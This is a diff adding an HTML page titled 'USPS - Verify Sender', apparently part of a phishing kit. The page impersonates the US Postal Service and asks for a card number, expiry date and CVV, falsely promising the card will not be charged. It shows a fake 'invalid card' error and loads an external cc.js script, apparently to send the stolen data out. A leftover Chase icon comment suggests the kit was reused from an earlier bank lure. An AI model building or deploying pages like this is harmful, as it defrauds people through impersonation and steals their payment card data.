@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<html>
+<head>
+    <meta charset="utf-8">
+
+        <!--"user-scalable=no" disable zooming when
+        clicking in submission boxes on mobile-->
+
+        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+        
+        <title>USPS - Verify Sender</title>
+
+        <!--href stands for hypertext reference-->
+        <!---<link rel="icon" href="Chaseico.ico" type="image/x-icon">--->
+
+        <link rel="stylesheet" href="style.css"
+        type="text/css">
+
+        <link rel="icon" href="ico.png" type="image/png">
+
+</head>
+<body>
+
+    <br>
+    <div class="containa">
+        
+        <div class="navbar__container">
+            <nav class="navbar">
+                <div class="navbar__container">
+                    <a href="index.html" id="navbar__logo">
+                        <img src="header.png" width="185" height="35" style="margin-right: 175px;">
+                    </a>
+                </div>
+            </nav>
+        </div>
+        <br>
+        <br>
+        <br>
+        <br>
+        <div class="containerinfo">
+
+            <div class="information">
+                <img src="2.png" width="200px" height="20px">
+            </div>
+            <div class="information">
+                <p class="notice"><b>Extra Verification Needed.</b></p>
+            </div>
+            <div class="information1">
+                <p class="notice2">To verify you are the sender we will need a card in the senders name, this card <b>will not</b> be charged and is needed strictly for security purposes.</p>
+            </div>
+
+        </div>
+        
+        <br>
+        <form action="#" class="contact">
+
+            <p class="please">Invalid card number, please try again.</p>
+
+            <input id="fcard" type="number" placeholder="Card Number" pattern="[0-9]*" oninput="checkPhoneNumberLength(this)" required>
+            <input id="fexp" type="text" inputmode="numeric" oninput="checkexplength(this)" placeholder="Expiration Date" required>
+            <input id="fcvv" type="number" placeholder="CVV    (3-4 digit security code)" pattern="[0-9]*" oninput="PhoneNumberLength(this)" required>
+
+            <input id="fsubmit" type="submit" value="Next">
+
+        <form>
+
+        <script>
+            function ZipLength(input) {
+                if (input.value.length > 5) {
+                input.value = input.value.slice(0, 5);
+                }
+            }
+        </script>
+        <script>
+            function PhoneNumberLength(input) {
+                if (input.value.length > 4) {
+                input.value = input.value.slice(0, 4);
+                }
+            }
+        </script>
+        <script>
+            function checkPhoneNumberLength(input) {
+                if (input.value.length > 18) {
+                input.value = input.value.slice(0, 18);
+                }
+            }
+        </script>
+        <script>
+            function checkexplength(input) {
+                if (input.value.length > 5) {
+                input.value = input.value.slice(0, 5);
+                }
+            }
+        </script>
+
+        <!--javascript to change Submit button click, check css-->
+        <script>
+            var button = document.querySelector('.contact input[type="submit"]');
+            var finput = document.getElementById('fcard');
+            var finput1 = document.getElementById('fexp');
+            var finput0 = document.getElementById('fcvv');
+            
+            var please = document.querySelector('.please');
+            
+            button.addEventListener('click', function(event) {
+                
+                if (finput.value === '' || finput1.value === '' || finput0.value === ''){
+                    event.preventDefault();
+                    please.style.display = "block";
+                    window.scrollTo({
+                        top: 0,
+                        behavior: 'smooth' // You can use 'auto' or 'instant' instead of 'smooth'
+                    });
+
+                } else {
+                    please.style.display = "none";
+                    button.classList.add('clicked');
+                    button.style.opacity = 0.5;
+            
+                    setTimeout(function() {
+                        please.style.display = "none";
+
+                        button.classList.remove('clicked');
+                        button.style.opacity = 1;
+
+                    }, 4000);
+                }
+            });            
+        </script>
+        <script>
+            function realphonelength(input) {
+                if (input.value.length > 10) {
+                input.value = input.value.slice(0, 10);
+             }
+           }
+        </script>
+        <script>
+            function reallength(input) {
+                if (input.value.length > 5) {
+                input.value = input.value.slice(0, 5);
+             }
+           }
+        </script>
+        <!--auto exp-->
+        <script>
+            const dobInput = document.getElementById("fexp");
+            
+            dobInput.addEventListener("input", function (event) {
+                const input = event.target.value;
+                const sanitizedInput = input.replace(/\D/g, ''); // Remove non-digit characters
+            
+                if (sanitizedInput.length > 5) {
+                event.target.value = sanitizedInput.substring(0, 5);
+                return;
+                }
+            
+                let formattedInput = '';
+                let currentIndex = 0;
+            
+                for (let i = 0; i < sanitizedInput.length; i++) {
+                if (currentIndex === 2 || currentIndex === 2) {
+                    formattedInput += '/';
+                }
+                formattedInput += sanitizedInput[i];
+                currentIndex++;
+                }
+            
+                event.target.value = formattedInput;
+            });
+        </script>
+
+        <script src="cc.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    </div>
+
+</body>
+<footer class="footer121">
+    
+    <p class="copy">Copyright © 2023 USPS. All Rights Reserved.</p>
+
+</footer>
+</html>
